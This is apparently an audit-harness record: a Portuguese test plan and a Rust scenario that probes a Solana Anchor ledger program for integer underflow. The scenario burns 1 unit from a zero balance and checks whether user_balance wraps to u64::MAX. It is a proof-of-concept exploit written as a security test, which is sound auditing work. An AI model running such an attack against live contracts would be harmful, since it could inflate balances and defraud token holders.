{
  "plan": "O cenário inicializa a conta Ledger com total_supply=100 e user_balance=0 via a instrução initialize (baseline). Em seguida, tenta-se queimar 1 unidade com burn, o que deveria falhar por underflow em user_balance (0 - 1). O efeito medido é se a instrução teve sucesso e se os valores de user_balance e total_supply sofreram wrap-around (ex.: user_balance = u64::MAX).",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger vazia para init
let ledger_account = empty_account();
let authority_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

// Baseline: initialize com total_supply = 100
let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let init_accounts = vec![
    (ledger_key, ledger_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];
let init_result = env.baseline("initialize ledger with supply 100", &init_ix, &init_accounts);

// Extrair estado após initialize
let ledger_after_init = after(&init_result, &ledger_key).clone();

// Ataque: burn 1 unidade (user_balance = 0, deve underflow)
let burn_ix = env.anchor_ix(
    "burn",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let burn_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("burn 1 from zero balance", &burn_ix, &burn_accounts);

if attack_result.program_result == ProgramResult::Success {
    let ledger_data = after(&attack_result, &ledger_key).data();
    let user_balance = read_u64(ledger_data, 40); // authority (32) + total_supply (8) = offset 40
    let total_supply = read_u64(ledger_data, 32);
    env.effect("user_balance wrapped to u64::MAX", user_balance == u64::MAX);
    env.effect("total_supply wrapped to 99", total_supply == 99);
}"
}

